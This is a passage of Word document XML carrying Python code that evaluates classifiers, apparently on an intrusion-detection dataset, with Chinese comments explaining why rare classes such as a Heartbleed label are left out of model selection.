        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return np.array([table[v] for v in y], dtype=np.float64)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44EC412C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7DD345E8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="36CC9CDF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def fit_model(model, name, X_train, y_train):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31F21AF3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if name == "xgboost":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="254946EE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return model.fit(X_train, y_train, sample_weight=balanced_weights(y_train))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A92C4BE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return model.fit(X_train, y_train)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A446EF0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0587ECF1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="462217AD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># -------------------------------------------------------------------- 评估</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20CB5ED3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49EB7833">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4CFA78A8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def evaluate(model, X, y_enc, classes):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BAB6D15">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """classes 是标签名列表；y_enc 是它们对应的 0..K-1 整数下标。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="120BA640">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    t0 = time.perf_counter()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57615BB7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    y_pred = model.predict(X)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01EEAEC8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    predict_ms = (time.perf_counter() - t0) / max(len(y_enc), 1) * 1000.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C6817D0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47242101">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    labels = list(range(len(classes)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FA6BB51">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    precision, recall, f1, support = precision_recall_fscore_support(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B59E8F4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        y_enc, y_pred, labels=labels, average=None, zero_division=0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39CFF652">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09470837">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 稀有类的单类 F1 本质是噪声，但它和常见类一样占 macro-F1 的 1/K 权重。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FF01852">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # Heartbleed 在全量数据里只有 11 行，测试集 1 行 —— 判对判错直接摆动 1/6 的总分，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07FF0948">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 用它来选模型等于抛硬币（实测把随机森林从第一拉到第五）。所以选型用剔除稀有类后的口径。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="305476DB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    reliable = [i for i, s in enumerate(support) if s &gt;= RARE_CLASS_SUPPORT]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F50C1AC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    macro_reliable = float(np.mean(f1[reliable])) if reliable else float("nan")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A31FA58">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69804979">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "accuracy": float(accuracy_score(y_enc, y_pred)),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A140DC2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "macro_f1": float(f1_score(y_enc, y_pred, average="macro", zero_division=0)),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29838A80">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "macro_f1_reliable": macro_reliable,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49C65F12">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "excluded_from_reliable": [str(classes[i]) for i in labels if i not in reliable],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FC81EA3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "weighted_f1": float(f1_score(y_enc, y_pred, average="weighted", zero_division=0)),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19A6DE83">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "predict_ms_per_row": float(predict_ms),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7526D6CF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "per_class": {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42A6C92E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            str(c): {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02DFD218">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                "precision": float(precision[i]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E836738">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                "recall": float(recall[i]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C34FB5D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                "f1": float(f1[i]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34B58CDB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                "support": int(support[i]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C50D3F4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F18C683">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            for i, c in enumerate(classes)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D4FF2EF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        },</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4822A2A7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "confusion_matrix": confusion_matrix(y_enc, y_pred, labels=labels).tolist(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6673FC41">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2414E3AC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="37031E13">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08CDDBF9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def selection_score(metrics):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5817C290">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """选型只看剔除稀有类后的 macro-F1；没有可信类时才退回原始 macro-F1。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48B4F79E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    score = metrics["macro_f1_reliable"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53496E36">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return score if score == score else metrics["macro_f1"]  # NaN 判断</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A074C08">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="28133923">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0ADEB292">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def saturation_note(results):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="329A7E38">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """第一名和第二名分不出来时返回一句说明，否则返回 None。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B7DB898">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="566F87CB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    只看前两名的差值，不看全体极差：逻辑回归掉队会把极差撑大，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ADDB0F9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    让这个告警永远不触发（第一版就是这么写的，等于空转）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A9676E9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A749597">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ranking = sorted(((r["selection_score"], k) for k, r in results.items()), reverse=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4415DF11">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if len(ranking) &lt; 2:</w:t>
      </w:r>
    </w:p>
